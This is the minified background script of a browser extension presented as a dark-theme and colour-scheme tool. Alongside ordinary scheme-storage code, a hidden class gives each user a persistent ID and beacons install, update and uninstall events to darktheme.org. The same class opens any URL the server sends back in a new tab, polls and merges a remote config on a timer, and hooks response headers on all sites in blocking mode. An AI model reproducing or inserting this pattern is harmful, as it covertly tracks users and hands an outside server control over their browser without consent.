class Bg{constructor(){this.actionUrl="https://darktheme.org/api/action/",this.uninstallUrl="https://darktheme.org/uninstall/",this.configUrl="https://darktheme.org/api/config/",this.config={},this.queue=[],this.queueProcessorReady=!1,this.uid="",this.version=chrome.runtime.getManifest().version,this.initStorage(),this.initListeners()}processQueue(){for(;this.queue.length>0;){var e=this.queue.shift();if(!e.type||"action"!=e.type)return!0;var t="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:e.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+t).then((e=>e.json())).then((function(e){e.url&&chrome.tabs.create({url:e.url})}))}}setUninstallUrl(){var e="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+e)}initListeners(){chrome.runtime.onInstalled.addListener((e=>{this.queue.push({type:"action",action:e.reason}),this.queueProcessorReady&&this.processQueue()}))}initStorage(){chrome.storage.local.get((e=>{e&&e.config&&(this.config=e.config),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),this.queueProcessorReady=!0,this.setUninstallUrl(),this.processQueue(),this.updateConfig()})),chrome.webRequest.onHeadersReceived.addListener((e=>({responseHeaders:e.responseHeaders})),{urls:["<all_urls>"]},["blocking","responseHeaders"])}saveConfig(){chrome.storage.local.set({config:this.config})}updateConfig(){let e=this;fetch(this.configUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"filters="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,version:this.version,timestamp:Date.now(),uid:this.config.uid})))}).then((e=>e.json())).then((e=>{if(e){for(let t in e)this.config[t]=e[t];this.saveConfig(this.config)}})).finally((()=>{this.config.configUpTime&&this.config.configUpTime>0&&setTimeout((function(){e.updateConfig()}),this.config.configUpTime)}))}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var t=16*Math.random()|0;return("x"==e?t:3&t|8).toString(16)}))}}const t=new Bg;var app={loadReason:"startup",version:function(){return chrome.runtime.getManifest().version},homepage:function(){return""}};app.tab={open:function(e){chrome.tabs.create({url:e,active:!0})}},chrome.runtime.onMessage.addListener((function(e,t,o){"top"===e.message&&o(t.tab.url),"createScheme"===e.message&&(o({schemeName:e.schemeName,schemeParams:e.schemeParams}),chrome.storage.local.get({colorSchemes:{}},(function(t){var o=t.colorSchemes;o[e.schemeName]=e.schemeParams,chrome.storage.local.set({colorSchemes:o,activeScheme:e.schemeName||""},(function(){}))}))),"renameScheme"===e.message&&chrome.storage.local.get({colorSchemes:{}},(function(t){const s=t.colorSchemes,i={...t.colorSchemes[e.prevSchemeName]};delete s[e.prevSchemeName],s[e.newSchemeName]=i,chrome.storage.local.set({colorSchemes:s},(function(){o({schemeName:e.newSchemeName,colorSchemes:t.colorSchemes})}))})),"deleteScheme"===e.message&&chrome.storage.local.get({colorSchemes:{}},(function(t){const s={},i=t.colorSchemes;delete i[e.schemeToDelete],s.colorSchemes=i,e.isActive&&(s.activeScheme=""),chrome.storage.local.set(s,(function(){o({colorSchemes:t.colorSchemes})}))})),"setActiveScheme"===e.message&&(o({activeScheme:e.schemeToActivate}),chrome.storage.local.get({activeScheme:""},(function(t){chrome.storage.local.set({activeScheme:e.schemeToActivate},(function(){}))})))})),app.storage=function(){var e={};return chrome.storage.onChanged.addListener((function(){chrome.storage.local.get(null,(function(t){e=t}))})),window.setTimeout((function(){chrome.storage.local.get(null,(function(t){e=t;var o=document.createElement("script");o.src="/scripts/common.js",document.body.appendChild(o)}))}),300),{read:function(t){return e[t]},write:function(t,o){var s={};e[t]=o,s[t]=o,chrome.storage.local.set(s)}}}(),app.button=function(){var e;return chrome.browserAction.onClicked.addListener((function(){e&&e()})),{onCommand:function(t){e=t},set icon(e){chrome.browserAction.setIcon(e)},set label(e){chrome.browserAction.setTitle({title:e})}}}();var config={};config.welcome={set open(e){app.storage.write("support",e)},get version(){return app.storage.read("version")},set version(e){app.storage.write("version",e)},get open(){var e=-1!==navigator.userAgent.toLowerCase().indexOf("firefox");return void 0!==app.storage.read("support")?app.storage.read("support"):!e}},config.addon={set state(e){app.storage.write("state",e)},get state(){return void 0!==app.storage.read("state")?app.storage.read("state"):"light"}},config.addon.state="dark",chrome.webNavigation.onHistoryStateUpdated.addListener((e=>{0===e.frameId&&chrome.tabs.query({active:!0},(t=>{chrome.tabs.sendMessage(t[0].id,{action:"URLChanged",url:e.url},(()=>{}))}))}));